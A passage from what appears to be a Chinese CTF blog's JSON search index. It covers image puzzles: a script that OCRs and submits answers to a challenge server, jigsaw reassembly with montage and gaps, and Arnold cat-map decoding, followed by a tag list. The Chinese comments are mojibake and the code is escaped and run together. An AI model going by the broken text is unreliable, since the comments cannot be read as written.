&#123;&quot;token&quot;:token,&quot;answer&quot;:answer&#125; response = requests.post(submit_url,json=data) return response.json()def getResult(token): result_url = url + &quot;/getResult&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(result_url,json=data) return response.json()[&#x27;data&#x27;]def getFlag(token): flag_url = url + &quot;/getFlag&quot; data = &#123;&quot;token&quot;:token&#125; response = requests.post(flag_url,json=data) return response.json()token = getToken()violWords = getViolWords()for i in range(51): pic = getPic(token) picWords = ocr(pic) result = checkWords(violWords,picWords) print(result) print(submit(token,result)) print(getResult(token))print(getFlag(token)) â€‹ æ‹¼å›¾123456789101112montage *.jpg -tile 10x12 -geometry +0+0 out.jpgmontage *.jpg -tile 10x12 -geometry 200x100+0+0 out.jpg #æŠŠå›¾ç‰‡ç¢ç‰‡åˆæˆä¸€ä¸ªå›¾ç‰‡# å°†ç›®å½•ä¸­çš„jpgæ–‡ä»¶æŒ‰é¡ºåºæ‹¼æˆxè½´10å—ï¼Œyè½´12å—ï¼Œæ¯ä¸ªå›¾å—å¤§å°ä¸º200x100åƒç´ ï¼Œè¾“å‡ºæ–‡ä»¶ä¸ºout.jpggaps --image=out.jpg --size=100 --savegaps --image=out.jpg --generations=50 --population=120 --size=100 --save#è¿˜åŸåŸå›¾ç‰‡# --image æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„# --size æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸ï¼ˆæ¯å¼ å°å›¾ï¼Œå³æ‹¼å›¾å°å—çš„å¤§å°ï¼‰# --generations é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡ï¼ˆè¿­ä»£æ¬¡æ•°ï¼‰# --population ä¸ªä½“æ•°é‡ï¼ˆæ‹¼å›¾æ€»æ•°ï¼‰# --verbose æ¯ä¸€ä»£è®­ç»ƒç»“æŸåå±•ç¤ºæœ€ä½³ç»“æœï¼ˆå®æ—¶æ˜¾ç¤ºï¼‰# --save å°†æ‹¼å›¾è¿˜åŸä¸ºå›¾åƒ â€‹ Arnoldå˜æ¢ / çŒ«è„¸å˜æ¢12345678910111213141516171819202122232425262728293031323334import cv2import numpy as npdef arnold_decode(image, shuffle_times, a, b): &quot;&quot;&quot; decode for rgb image that encoded by Arnold Args: image: rgb image encoded by Arnold shuffle_times: how many times to shuffle Returns: decode image &quot;&quot;&quot; # 1:åˆ›å»ºæ–°å›¾åƒ decode_image = np.zeros(shape=image.shape,dtype=int) # 2ï¼šè®¡ç®—N h, w = image.shape[0], image.shape[1] N = h # æˆ–N=w # 3ï¼šéå†åƒç´ åæ ‡å˜æ¢ for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): # æŒ‰ç…§å…¬å¼åæ ‡å˜æ¢ new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N new_y = ((-a) * ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] return decode_imageimg = cv2.imread(&quot;a.png&quot;) #å˜æ¢çš„å›¾ç‰‡a = 121b = 144st = 1pic = arnold_decode(img,st,a,b)cv2.imwrite(&#x27;b.png&#x27;,pic) #ä¿å­˜å¾—åˆ°çš„å›¾ç‰‡ å·¥å…·ï¼š Catmap Zhanxw Cat â€‹ é©¬èµ›å…‹unredacter","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"å›¾åƒ","slug":"å›¾åƒ","permalink":"https://lazzzaro.github.io/tags/%E5%9B%BE%E5%83%8F/"}],"author":"Lazzaro"}],"categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"},{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"},{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"},{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"},{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"},{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"},{"name":"other","slug":"other","permalink":"https://lazzzaro.github.io/categories/other/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"},{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"},{"name":"åé‡å­å¯†ç ","slug":"åé‡å­å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"},{"name":"js","slug":"js","permalink":"https://lazzzaro.github.io/tags/js/"},{"name":"æ··æ·†","slug":"æ··æ·†","permalink":"https://lazzzaro.github.io/tags/%E6%B7%B7%E6%B7%86/"},{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"},{"name":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"å †","slug":"å †","permalink":"https://lazzzaro.github.io/tags/%E5%A0%86/"},{"name":"æ ˆ","slug":"æ ˆ","permalink":"https://lazzzaro.github.io/tags/%E6%A0%88/"},{"name":"OT","slug":"OT","permalink":"https://lazzzaro.github.io/tags/OT/"},{"name":"hash","slug":"hash","permalink":"https://lazzzaro.github.io/tags/hash/"},{"name":"WebAssembly","slug":"WebAssembly","permalink":"https://lazzzaro.github.io/tags/WebAssembly/"},{"name":"wasm","slug":"wasm","permalink":"https://lazzzaro.github.io/tags/wasm/"},{"name":"XXE","slug":"XXE","permalink":"https://lazzzaro.github.io/tags/XXE/"},{"name":"åè°ƒè¯•","slug":"åè°ƒè¯•","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"æ›²çº¿","slug":"æ›²çº¿","permalink":"https://lazzzaro.github.io/tags/%E6%9B%B2%E7%BA%BF/"},{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"},{"name":"ç»•è¿‡","slug":"ç»•è¿‡","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"},{"name":"Unity","slug":"Unity","permalink":"https://lazzzaro.github.io/tags/Unity/"},{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"},{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"},{"name":"æµé‡","slug":"æµé‡","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E9%87%8F/"},{"name":"USB","slug":"USB","permalink":"https://lazzzaro.github.io/tags/USB/"},{"name":"ECC","slug":"ECC","permalink":"https://lazzzaro.github.io/tags/ECC/"},{"name":"å—å¯†ç ","slug":"å—å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E5%9D%97%E5%AF%86%E7%A0%81/"},{"name":"AES","slug":"AES","permalink":"https://lazzzaro.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://lazzzaro.github.io/tags/DES/"},{"name":"æ ¼å¯†ç ","slug":"æ ¼å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/"},{"name":"æµå¯†ç ","slug":"æµå¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"},{"name":"XSS","slug":"XSS","permalink":"https://lazzzaro.github.io/tags/XSS/"},{"name":"SSRF","slug":"SSRF","permalink":"https://lazzzaro.github.io/tags/SSRF/"},{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"},{"name":"é€ƒé€¸","slug":"é€ƒé€¸","permalink":"https://lazzzaro.github.io/tags/%E9%80%83%E9%80%B8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://lazzzaro.github.io/tags/CSRF/"},{"name":"JWT","slug":"JWT","permalink":"https://lazzzaro.github.io/tags/JWT/"},{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://lazzzaro.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://lazzzaro.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"å†…ç½‘","slug":"å†…ç½‘","permalink":"https://lazzzaro.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"å‘½ä»¤è¡Œ","slug":"å‘½ä»¤è¡Œ","permalink":"https://lazzzaro.github.io/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"name":"Linux","slug":"Linux","permalink":"https://lazzzaro.github.io/tags/Linux/"},{"name":"Bash","slug":"Bash","permalink":"https://lazzzaro.github.io/tags/Bash/"},{"name":"å–è¯","slug":"å–è¯","permalink":"https://lazzzaro.github.io/tags/%E5%8F%96%E8%AF%81/"},{"name":"éšå†™","slug":"éšå†™","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"},{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"å¯†ç ","slug":"å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"},{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"CMS","slug":"CMS","permalink":"https://lazzzaro.github.io/tags/CMS/"},{"name":"ç¼–ç ","slug":"ç¼–ç ","permalink":"https://lazzzaro.github.io/tags/%E7%BC%96%E7%A0%81/"},{"name":"åç¼–è¯‘","slug":"åç¼–è¯‘","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"},{"name":"fuzz","slug":"fuzz","permalink":"https://lazzzaro.github.io/tags/fuzz/"},{"name":"SQL","slug":"SQL","permalink":"https://lazzzaro.github.io/tags/SQL/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://lazzzaro.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"RCE","slug":"RCE","permalink":"https://lazzzaro.github.io/tags/RCE/"},{"name":"SSTI","slug":"SSTI","permalink":"https://lazzzaro.github.io/tags/SSTI/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"pwntools","slug":"pwntools","permalink":"https://lazzzaro.github.io/tags/pwntools/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"https://lazzzaro.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"angr","slug":"angr","permalink":"https://lazzzaro.github.io/tags/angr/"},{"name":"z3","slug":"z3","permalink":"https://lazzzaro.github.io/tags/z3/"},{"name":"IDA","slug":"IDA","permalink":"https://lazzzaro.github.io/tags/IDA/"},{"name":"Sage","slug":"Sage","permalink":"https://lazzzaro.github.io/tags/Sage/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://lazzzaro.github.io/tags/gmpy2/"},{"name":"Android","slug":"Android","permalink":"https://lazzzaro.github.io/tags/Android/"},{"name":"ç¦»æ•£å¯¹æ•°","slug":"ç¦»æ•£å¯¹æ•°","permalink":"https://lazzzaro.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://lazzzaro.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"å›¾åƒ","slug":"å›¾åƒ","permalink":"https://lazzzaro.github.io/tags/%E5%9B%BE%E5%83%8F/"}]}